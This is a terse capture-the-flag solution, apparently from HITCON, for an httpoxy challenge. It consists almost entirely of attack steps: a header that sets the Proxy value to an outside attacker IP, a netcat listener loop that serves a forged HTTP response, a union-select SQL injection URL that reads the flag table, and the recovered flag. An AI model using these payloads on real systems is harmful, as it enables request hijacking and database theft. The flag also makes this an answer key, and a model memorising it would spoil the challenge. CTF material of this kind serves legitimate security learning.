
-H "proxy:60.251.236.17:1337"

HTTP_proxy env

while true; do cat response | nc -l -p 1337 -v; done

'''
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Length: 2
Content-Type: text/html;charset=UTF-8

ok
'''

https://54.199.254.155/cgi-bin/?id=7'union select 1,(select * from flag)--

* hitcon{Did you know httpoxy.org?} 